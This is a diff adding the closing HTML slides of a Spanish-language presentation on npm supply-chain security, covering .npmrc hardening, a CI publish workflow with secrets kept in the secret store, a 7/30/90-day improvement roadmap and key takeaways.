+          <div class="kicker" style="margin-bottom: 8px;"><span class="num">2</span> Autenticación</div>
+          <p class="small" style="color: var(--fg-2); margin: 0;"><span class="mono">${VAR}</span> referencia variables de entorno: el token vive en el secret store, no en el repo.</p>
+        </div>
+        <div class="card" style="padding: 18px 22px;">
+          <div class="kicker" style="margin-bottom: 8px;"><span class="num">3-4</span> Comportamiento</div>
+          <p class="small" style="color: var(--fg-2); margin: 0;"><span class="mono">ignore-scripts</span> es la línea más impactante: desarma <em>typosquatting</em> y muchos paquetes maliciosos. <span class="mono">save-exact</span> hace el manifiesto reproducible.</p>
+        </div>
+        <div class="card" style="padding: 18px 22px;">
+          <div class="kicker" style="margin-bottom: 8px;"><span class="num">5-6</span> Auditoría &amp; ruido</div>
+          <p class="small" style="color: var(--fg-2); margin: 0;">El audit corre automáticamente; el build falla a partir de <em>high</em>. Los notifiers se silencian para no contaminar logs del CI.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="footbar"><div>04 · .npmrc / Ejemplo</div><div class="pageno">23 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 24 · NPMRC IN CI ==================== -->
+<section data-screen-label="24 .npmrc en CI/CD">
+  <div class="frame dense">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>04 · .npmrc</span><span class="active">// CI/CD</span></div>
+      <div class="meta"><span>24 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">04.5 · Pipelines</div>
+      <h2 class="h2" style="max-width: 26ch;"><span class="mono" style="color:var(--accent);">.npmrc</span> en CI/CD: dos archivos, dos responsabilidades.</h2>
+    </div>
+
+    <div style="margin-top: 32px;" class="grid-2">
+      <div class="stack-24">
+        <div class="card">
+          <div class="kicker"><span class="num">A</span> El <span class="mono">.npmrc</span> versionado</div>
+          <p class="body" style="margin:0; font-size:18px;">Política compartida: registries, scopes, flags de seguridad. <strong style="color:var(--fg);">Nunca contiene secretos</strong> — solo referencias <span class="mono">${VAR}</span>.</p>
+        </div>
+        <div class="card">
+          <div class="kicker"><span class="num">B</span> El <span class="mono">.npmrc</span> efímero del runner</div>
+          <p class="body" style="margin:0; font-size:18px;">Generado al inicio del job desde secretos del CI, en <span class="mono">$HOME/.npmrc</span>. Se destruye con el runner. Nunca aparece en logs ni en artefactos.</p>
+        </div>
+        <div class="card">
+          <div class="kicker"><span class="num">+</span> Comandos clave del job</div>
+          <div class="term" style="font-size: 13px;">
+            <div class="term-bar"><div class="lights"><span></span><span></span><span></span></div><span>ci.sh</span></div>
+<pre>$ <span class="c-key">npm</span> ci --ignore-scripts
+$ <span class="c-key">npm</span> audit --audit-level=high --omit=dev
+$ <span class="c-key">npm</span> run build
+$ <span class="c-key">npm</span> publish --provenance --access restricted</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="term" style="font-size: 13.5px; line-height: 1.5;">
+        <div class="term-bar">
+          <div class="lights"><span></span><span></span><span></span></div>
+          <span>.github/workflows/release.yml — extracto</span>
+        </div>
+<pre><span class="c-key">jobs</span>:
+  <span class="c-key">publish</span>:
+    <span class="c-key">permissions</span>:
+      <span class="c-key">contents</span>: read
+      <span class="c-key">id-token</span>: write        <span class="c-cmt"># OIDC para provenance</span>
+    <span class="c-key">steps</span>:
+      - <span class="c-key">uses</span>: actions/setup-node@v4
+        <span class="c-key">with</span>:
+          <span class="c-key">node-version</span>: <span class="c-str">'20'</span>
+          <span class="c-key">registry-url</span>: <span class="c-str">'https://npm.acme.internal/'</span>
+
+      <span class="c-cmt"># El runner genera ~/.npmrc temporal</span>
+      <span class="c-cmt"># con el token inyectado por el secret store</span>
+      - <span class="c-key">run</span>: npm ci --ignore-scripts
+        <span class="c-key">env</span>:
+          <span class="c-key">NODE_AUTH_TOKEN</span>: ${{ secrets.ACME_NPM_TOKEN }}
+
+      - <span class="c-key">run</span>: npm audit --audit-level=high --omit=dev
+      - <span class="c-key">run</span>: npm test
+      - <span class="c-key">run</span>: npm publish --provenance
+        <span class="c-key">env</span>:
+          <span class="c-key">NODE_AUTH_TOKEN</span>: ${{ secrets.ACME_NPM_TOKEN }}</pre>
+      </div>
+    </div>
+
+    <div class="footbar"><div>04 · .npmrc / CI/CD</div><div class="pageno">24 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 25 · SECTION 5 + CHECKLIST ==================== -->
+<section data-screen-label="25 Hoja de ruta">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>05 · roadmap</span><span class="active">// proyectos reales</span></div>
+      <div class="meta"><span>25 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">Sección 05 · Aplicación</div>
+      <h2 class="h2" style="max-width: 26ch;">Mejora de la seguridad en proyectos reales.</h2>
+      <p class="lead" style="margin-top: 16px; max-width: 56ch;">Hoja de ruta accionable en tres horizontes — cada paso es independiente y entrega valor por sí mismo.</p>
+    </div>
+
+    <div style="margin-top: 36px;" class="grid-3">
+      <div class="card">
+        <div class="kicker"><span class="num">D7</span> Inmediato · 1 semana</div>
+        <ul class="checklist">
+          <li><div class="box">✓</div><div><div class="txt">Comitear lockfile + cambiar CI a <span class="mono">npm ci</span>.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt"><span class="mono">.npmrc</span> con <span class="mono">ignore-scripts</span> y <span class="mono">save-exact</span>.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">2FA en todas las cuentas que publican.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Quitar tokens de larga vida del repo.</div></div></li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">D30</span> Corto · 1 mes</div>
+        <ul class="checklist">
+          <li><div class="box">✓</div><div><div class="txt">Registry privado como proxy del público.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt"><span class="mono">npm audit</span> bloqueante en PRs.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">SCA adicional (Snyk / Dependabot / OSV).</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Scopes <span class="mono">@empresa/*</span> mapeados a privado.</div></div></li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">D90</span> Medio · 1 trimestre</div>
+        <ul class="checklist">
+          <li><div class="box">✓</div><div><div class="txt">SBOM (CycloneDX) en cada release.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Provenance / OIDC para publicar sin tokens.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Cooldown de 7–14 días para versiones nuevas.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Playbook de respuesta a incidente de supply chain.</div></div></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footbar"><div>05 · Roadmap / Acción</div><div class="pageno">25 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 26 · KEY TAKEAWAYS ==================== -->
+<section data-screen-label="26 Conclusiones">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>05 · roadmap</span><span class="active">// conclusiones</span></div>
+      <div class="meta"><span>26 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">Cierre</div>
+      <h2 class="h2" style="max-width: 28ch;">Cinco ideas para llevarse.</h2>
+    </div>
+
+    <div style="margin-top: 56px;" class="stack-16">
+      <ol class="numbered">
+        <li><div><div class="t">Instalar es ejecutar.</div><div class="d">Todo análisis de riesgo en npm empieza aceptando que <span class="mono">npm install</span> ejecuta código de terceros antes de que tu app exista.</div></div></li>
+        <li><div><div class="t">El lockfile no es opcional.</div><div class="d">Sin él, la reproducibilidad es ficticia y cualquier compromiso ascendente entra silencioso.</div></div></li>
+        <li><div><div class="t">Tu superficie es transitiva.</div><div class="d">Las defensas (auditoría, SBOM, cooldown) deben razonar sobre el árbol completo, no sobre las 12 deps directas.</div></div></li>
+        <li><div><div class="t">El <span class="mono">.npmrc</span> es política versionable.</div><div class="d">Scopes, <span class="mono">ignore-scripts</span> y registries privados cierran tres vectores con cinco líneas de configuración.</div></div></li>
+        <li><div><div class="t">Identidad &gt; tokens.</div><div class="d">OIDC, provenance y 2FA mueven la confianza del secreto compartido a la identidad federada del CI.</div></div></li>
+      </ol>
+    </div>
+
+    <div class="footbar"><div>Conclusiones</div><div class="pageno">26 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 27 · CLOSE ==================== -->
+<section data-screen-label="27 Cierre">
+  <div class="title-bg"></div>
+  <div class="grid-bg"></div>
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec · 2026</span></div>
+      <div class="meta"><span>Fin</span><span>27 / 27</span></div>
+    </div>
+
+    <div style="margin: auto 0; max-width: 1500px;">
+      <div class="eyebrow" style="margin-bottom: 32px;">// end of deck</div>
+      <h1 class="h1" style="max-width: 22ch;">Gracias.<br/><span style="color: var(--accent);">Preguntas, comentarios, casos.</span></h1>
+      <p class="lead" style="margin-top: 36px; max-width: 50ch;">El objetivo no es eliminar el riesgo de npm — es hacerlo visible, medible y proporcional al valor que aporta el ecosistema.</p>
+    </div>
+
+    <div class="footbar">
+      <div>Seguridad en npm · DevSecOps</div>
+      <div>27 / 27</div>
+    </div>
+  </div>
+</section>
+
+</deck-stage>
+
+</body>
+</html>
